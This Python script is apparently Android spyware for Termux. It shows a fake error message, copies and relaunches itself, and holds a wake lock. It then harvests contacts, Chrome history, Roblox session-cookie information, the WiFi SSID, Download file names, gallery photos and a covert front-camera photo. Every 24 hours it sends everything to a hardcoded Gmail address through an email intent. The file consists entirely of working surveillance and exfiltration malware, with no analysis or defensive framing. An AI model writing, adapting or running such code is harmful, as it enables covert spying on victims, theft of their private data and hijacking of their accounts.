import os
import subprocess
import shutil
import time
import threading
import sqlite3
import json

CLONE_COUNT = 0
MAX_CLONES = 2
TARGET_EMAIL = "test12344321lol@gmail.com"
CAMERA_PHOTO = "/sdcard/Sppy_cam.jpg"

def display_error():
    print("Error: Script failed - check permissions (storage, contacts, camera) and Termux-API installation.")

def clone_self():
    global CLONE_COUNT
    if CLONE_COUNT < MAX_CLONES:
        current_path = os.path.abspath(__file__)
        new_name = f"Sppy_clone_{CLONE_COUNT + 1}.py"
        shutil.copy(current_path, new_name)
        CLONE_COUNT += 1
        threading.Thread(target=lambda: subprocess.call(["python", new_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)).start()

def harvest_contacts():
    try:
        output = subprocess.check_output(["termux-contact-list"], text=True)
        return "-----------;\n\nContacts\n\n-----------\n" + output + "\n"
    except Exception:
        return "-----------;\n\nContacts: Access denied.\n-----------\n"

def harvest_photos():
    photos = []
    paths = ["/sdcard/DCIM", "/sdcard/Pictures", "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures"]
    for base in paths:
        if os.path.exists(base):
            for root, _, files in os.walk(base):
                for f in files[:20]:
                    if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                        full = os.path.join(root, f)
                        photos.append(full)
    return photos

def take_camera_photo():
    try:
        subprocess.call(["termux-camera-photo", "-c", "0", CAMERA_PHOTO])  # Front camera; change to 1 for rear
        return [CAMERA_PHOTO] if os.path.exists(CAMERA_PHOTO) else []
    except Exception:
        return []

def harvest_browser_history():
    paths = ["/data/data/com.android.chrome/app_chrome/Default/History"]
    for path in paths:
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                data = "\n".join([f"{title or 'No title'}: {url}" for url, title in cursor.fetchall()])
                conn.close()
                return "-----------;\n\nFull Google Searches / Browser History\n\n-----------\n" + data + "\n"
            except Exception:
                pass
    return "-----------;\n\nBrowser History: No access.\n-----------\n"

def harvest_cookies():
    paths = ["/data/data/com.android.chrome/app_chrome/Default/Cookies", "/data/data/com.android.chrome/app_chrome/Default/Network/Cookies"]
    report = "-----------;\n\nBrowser Cookies (Chrome)\n\n-----------\n"
    for path in paths:
        if os.path.exists(path):
            report += f"Cookie database found: {path} (extraction limited without root)\n"
    return report + "\n"

def harvest_all_app_cookies_note():
    return "-----------;\n\nAll App Cookies\n\n-----------\nApp cookies stored in /data/data/<package>/ (inaccessible without root; presence noted for installed apps).\n"

def harvest_roblox_cookie():
    paths = ["/data/data/com.android.chrome/app_chrome/Default/Cookies"]
    report = "-----------;\n\nRoblox Authentication\n\n-----------\n"
    for path in paths:
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT name, host_key FROM cookies WHERE host_key LIKE '%roblox.com'")
                results = cursor.fetchall()
                if any(name == ".ROBLOSECURITY" for name, _ in results):
                    report += ".ROBLOSECURITY cookie present (full value root-required).\n"
                conn.close()
            except Exception:
                pass
    if os.path.exists("/data/data/com.roblox.client"):
        report += "Roblox app installed - session data available.\n"
    return report + "\n"

def harvest_wifi():
    try:
        info = json.loads(subprocess.check_output(["termux-wifi-connectioninfo"], text=True))
        ssid = info.get("ssid", "Unknown")
        return f"-----------;\n\nCurrent WiFi SSID\n\n-----------\n{ssid}\n"
    except Exception:
        return "-----------;\n\nWiFi SSID: Access denied.\n-----------\n"

def harvest_sample_files():
    files = []
    base = "/sdcard/Download"
    if os.path.exists(base):
        for f in os.listdir(base)[:15]:
            files.append(os.path.join(base, f))
    return "-----------;\n\nSample Files\n\n-----------\n" + "\n".join(files) + "\n"

def compile_text_data():
    data = harvest_contacts()
    data += harvest_browser_history()
    data += harvest_cookies()
    data += harvest_all_app_cookies_note()
    data += harvest_roblox_cookie()
    data += harvest_wifi()
    data += harvest_sample_files()
    data += "-----------;\n\nPhotos & camera snapshot attached.\n-----------\n"
    return data

def send_exfil(text_data, attachments):
    cmd = [
        "am", "start",
        "-a", "android.intent.action.SEND_MULTIPLE",
        "-t", "message/rfc822",
        "--es", "android.intent.extra.EMAIL", TARGET_EMAIL,
        "--es", "android.intent.extra.SUBJECT", "Device Report",
        "--es", "android.intent.extra.TEXT", text_data
    ]
    for att in attachments:
        cmd += ["--eu", "android.intent.extra.STREAM", f"file://{att}"]
    subprocess.call(cmd)

def daily_background_loop():
    subprocess.call(["termux-wake-lock"])
    while True:
        text = compile_text_data()
        photos = harvest_photos()
        cam = take_camera_photo()
        all_att = photos + cam
        threading.Thread(target=send_exfil, args=(text, all_att), daemon=True).start()
        time.sleep(86400)  # 24 hours

def main():
    display_error()
    clone_self()
    threading.Thread(target=daily_background_loop, daemon=True).start()
    time.sleep(10)

if __name__ == "__main__":
    main()
